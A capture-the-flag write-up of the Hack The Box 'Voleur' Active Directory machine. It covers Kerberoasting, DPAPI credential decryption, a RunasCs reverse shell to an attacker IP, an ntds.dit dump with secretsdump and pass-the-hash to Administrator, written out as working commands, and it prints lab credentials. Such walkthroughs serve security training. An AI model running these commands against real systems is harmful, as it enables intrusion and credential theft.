We start by performing a **quick port scan** with **Nmap** to see which ports are open.

```
sudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76
```

![1](/images/writeups/voleur/1.png)

Using these ports, we now perform a **deeper scan**, saving the results to a file called "***target***".

```
nmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target
```

![2](/images/writeups/voleur/2.png)

We add the domain to the ***/etc/hosts*** file so we can resolve both the **domain** and the **domain controller** name.

![3](/images/writeups/voleur/3.png)

To start hacking the machine, we are given some initial credentials.

```
ryan.naylor : HollowOct31Nyt
```

When trying to enumerate **SMB shares** with the credentials `ryan.naylor:HollowOct31Nyt`, authentication fails. This is not because the credentials are wrong, but because the **Active Directory** server does not allow direct authentication with username and password, it requires **Kerberos**. In other words, before interacting with **SMB**, we need a **TGT** (Ticket Granting Ticket) that proves our identity to the **KDC** (Key Distribution Center, the central server that issues authentication tickets in the domain).

To obtain the **TGT**, we first **synchronize** the clock with the domain server, since **Kerberos** is sensitive to time differences.

```
sudo ntpdate voleur.htb
```

Since **Kali** doesnâ€™t sync directly with the domain server using **ntpdate**, I used **faketime** to simulate the correct time in the process of generating the ticket.

```
faketime 'YYYY-MM-DD HH:MM:SS' impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
```

Then, I exported the generated file to the **KRB5CCNAME** environment variable.

```
export KRB5CCNAME=$PWD/ryan.naylor.ccache
```

This tells all **Kerberos** tools (and **SMB** in our case) to use that ticket instead of attempting to authenticate directly with the password.

![4](/images/writeups/voleur/4.png)

You can use `klist` to verify that the ticket was loaded correctly.

![5](/images/writeups/voleur/5.png)

Now, to access the shared resources, instead of `smbclient` I used `impacket-smbclient`, as it offers more reliable **Kerberos** support and allows directly using **cached tickets** (-k -no-pass).

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb
```

![6](/images/writeups/voleur/6.png)

We found an **Excel file** that is password protected, so we cannot open it directly. We use `office2john` to extract the password **hash** and save it to a file.

![7](/images/writeups/voleur/7.png)

```
office2john Access_Review.xlsx > hash
```

Then we use **John The Ripper** to crack the password.

```
john -w=/usr/share/wordlists/rockyou.txt hash
```

![8](/images/writeups/voleur/8.png)

Once we know the password, we can access the **Excel file**.

![9](/images/writeups/voleur/9.png)

We obtain the credentials for the users **svc_ldap** and **svc_iis**.

```
svc_ldap : M1XyC9pW7qT5Vn
svc_iss : N5pXyW1VqM7CZ8
```

At this point, thereâ€™s nothing more interesting to explore.

We now choose **svc_ldap** instead of **ryan.naylor** for domain mapping with [**BloodHound**](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart), as this user has more extensive **read permissions** that allow collecting all **relationships**, **ACLs**, and possible **escalation paths**, whereas a normal user like **ryan.naylor** would have limited access.

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" bloodhound-python -d 'voleur.htb' -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -gc 'dc.voleur.htb' -ns 10.10.11.76 -v --zip -c all
```

![10](/images/writeups/voleur/10.png)

We upload the resulting **ZIP** file to **BloodHound** and, analyzing the user **svc_ldap**, we see that they have `WriteSPN` permissions over the user **svc_winrm** and belong to the **RESTORE_USERS** group, which has `GenericWrite` permissions over **lacey.miller**. With these permissions, it is possible to perform a **Kerberoasting Attack** to **extract the password hashes** of these users.

We create another **TGT**, this time for the user **svc_ldap**.

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'
export KRB5CCNAME=$PWD/svc_ldap.ccache
```

Then we clone the [**targetedKerberoast**](https://github.com/ShutdownRepo/targetedKerberoast/tree/main) repository and run it. It uses the **svc_ldap TGT** to request service tickets (**SPNs**) for which it has permissions. These tickets are encrypted as **hashes**, which we can then attempt to **crack**.

```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
```

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" python3 targetedKerberoast.py -v -d 'voleur.htb' -u 'svc_ldap' --dc-host dc.voleur.htb -k
```

![11](/images/writeups/voleur/11.png)


Finally, we use **John the Ripper** to crack the hashes.

```
john -w=/usr/share/wordlists/rockyou.txt hashes
```

![12](/images/writeups/voleur/12.1.png)

We obtain a single **password**, and after testing which account it belongs to, we realize it is for **svc_winrm**.

Checking the **Excel** file, we see that this user has **Remote Management** permissions, so we can access the machine remotely using Evil-WinRM. To do this, we generate a new **TGT**, this time for the **svc_winrm** user.

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" impacket-getTGT voleur.htb/'svc_winrm':'{SVC_WINRM-PASSWORD}'
export KRB5CCNAME=$PWD/svc_winrm.ccache
```

In this case, we edit ***/etc/krb5.conf*** because **Evil-WinRM** cannot resolve the **KDC** by domain name, and using the **IP** directly allows the connection to work correctly.

```
[libdefaults]
  default_realm = VOLEUR.HTB

[realms]
  VOLEUR.HTB = {
    kdc = 10.10.11.76
    admin_server = 10.10.11.76
  }

[domain_realm]
  .voleur.htb = VOLEUR.HTB
  voleur.htb = VOLEUR.HTB
```

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" evil-winrm -i dc.voleur.htb -r voleur.htb
```

![13](/images/writeups/voleur/13.png)

We obtain the **User Flag**, located in the **Desktop** directory.

As seen earlier, the user **svc_ldap** belongs to the **RESTORE_USERS** group, so if we access it, we can restore the user **todd.wolfe**, identified in the **Excel** file, whose password was provided: `NightT1meP1dg3on14`.

The first step is to upload **RunasCS**, an executable that allows us to run commands as another user.

```
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
unzip RunasCs.zip
```

We upload it to the target machine via **Evil-WinRM** using the **svc_winrm** account.

```
upload RunasCs.exe
```

Next, we execute a **Reverse Shell** to access the machine as **svc_ldap**.

```
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.79:4444
```

![14](/images/writeups/voleur/14.png)

Once inside, we **search for the deleted user**.

```
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

![15](/images/writeups/voleur/15.png)


We **restore** it using its **ObjectID**.

```
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

![16](/images/writeups/voleur/16.png)

With the **todd.wolfe** account restored, we can now access its shared resources. Before doing so, we create a **TGT** for this user so we can authenticate correctly and use their permissions.

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" impacket-getTGT voleur.htb/'todd.wolfe':'NightT1meP1dg3on14'
export KRB5CCNAME=$PWD/todd.wolfe.ccache
```

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/todd.wolfe@dc.voleur.htb
```

Accessing the system as **todd.wolfe**, we can explore their `AppData/Roaming/Microsoft` directory, which contains critical folders like **Credentials**, **Crypto**, and **Vault**. These folders store sensitive information protected by **DPAPI** (Data Protection API), used by **Windows** to encrypt **passwords**, **keys**, and **user certificates**.

Since we are already authenticated as the user, we can extract these files and **decrypt** them locally without attacking other account hashes. This exploits the known **DPAPI Weakness** / **Credential Store Exposure**, allowing us to retrieve the current userâ€™s encrypted secrets.

![16.1](/images/writeups/voleur/16.1.png)

![16.2](/images/writeups/voleur/16.2.png)

**Sensitive file extraction:**

- **Master Key**: contains the key to decrypt all of the userâ€™s secrets.

```
get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
```

- **Credentials**: stores an encrypted password that can be recovered using the Master Key.

```
get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3
```

After downloading the sensitive files, we use `impacket-dpapi` to **decrypt** them. First, using the **Master Key** file, the userâ€™s **SID**, and their **password**, we obtain the **Master Key hash**, representing the key protecting all user secrets. This **hash** is then used to decrypt any file protected by **DPAPI**.

```
impacket-dpapi masterkey \
    -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
    -sid S-1-5-21-3927696377-1337352550-2781715495-1110 \
    -password NightT1meP1dg3on14
```

![17](/images/writeups/voleur/17.png)

With this **hash**, **we can decrypt files inside Credentials**, which may contain passwords or other encrypted secrets stored by the user.

```
impacket-dpapi credential \
    -file 772275FAD58525253490A9B0039791D3 \
    -key 0xd2832547d1d5e0a01...
```

![18](/images/writeups/voleur/18.png)

It contains the password for the user **jeremy.combs**.

![19](/images/writeups/voleur/19.png)

The user **jeremy.combs** belongs to the **THIRD-LINE TECHNICIANS** group, allowing us to access the groupâ€™s shared resources and review stored information, after first creating the **TGT** for this user.

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/jeremy.combs@dc.voleur.htb
```

![20](/images/writeups/voleur/20.png)

Within the shared resources, we find two items of interest: a **note** and an **id_rsa** file, corresponding to an **SSH private key**.

The content of the note is:

![21](/images/writeups/voleur/21.png)

To identify **which user owns the private key**, we generate the **public key** from it using:

```
sudo ssh-keygen -y -f id_rsa
```

![22](/images/writeups/voleur/22.png)

The userâ€™s name often appears **at the end of the public key**, allowing us to confirm the owner.

In the **Nmap** scan performed at the start, we had already identified that the **SSH** service is exposed on port **2222**.

Before using the downloaded **private key**, we set the proper **permissions**.

```
chmod 600 id_rsa
```

With the key ready, we connect to the **SSH** server on port **2222** using the user **svc_backup**.

```
ssh -i id_rsa -p 2222 svc_backup@voleur.htb
```

![23](/images/writeups/voleur/23.png)

Connecting via **SSH**, we see we are in a **Linux** environment. Inspecting the `/mnt` mount point, we find the **Windows C: volume** accessible, meaning we can access the **Windows filesystem** from the **Linux** host. Inside `/mnt/c/IT/Third-Line Support`, we find a new folder called ***Backups*** and within it the ***Active Directory*** folder, which contains `ntds.dit` and `ntds.jfm`.

![24](/images/writeups/voleur/24.png)

- **ntds.dit** is the **main Active Directory database**, storing **user accounts**, **groups**, **policies**, and password **hashes**.

- **ntds.jfm** is a **log file** that keeps the database consistent when changes are made or recovered.

Next, we **download them** to our local machine so we can use them.

```
scp -i id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/*" .
```

In addition to the **AD database**, we also need the **SYSTEM** file, which contains keys required to decrypt the **hashes** stored in `ntds.dit`. It is located at `/mnt/c/IT/Third-Line Support/Backups/registry`.

![25](/images/writeups/voleur/25.png)

```
scp -i id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Registry/SYSTEM" .
```

With these three files locally, we use `impacket-secretsdump` to extract **Active Directory account hashes**.

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

![26](/images/writeups/voleur/26.png)

Among the results, we obtain the **NTLM hash** of the **Administrator** account password, which we use to request a **TGT** for this user. With this **TGT**, we can authenticate as **Administrator** and access their privileges.

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" impacket-getTGT -hashes :<ADMINISTRATOR_NTLM_HASH> voleur.htb/'Administrator'
export KRB5CCNAME=$PWD/Administrator.ccache
```

```
faketime "$(ntpdate -q voleur.htb | awk '{print $1 " " $2}')" evil-winrm -i dc.voleur.htb -r voleur.htb
```

![27](/images/writeups/voleur/27.png)

Finally, we obtain the **Root Flag** and complete the machine!!
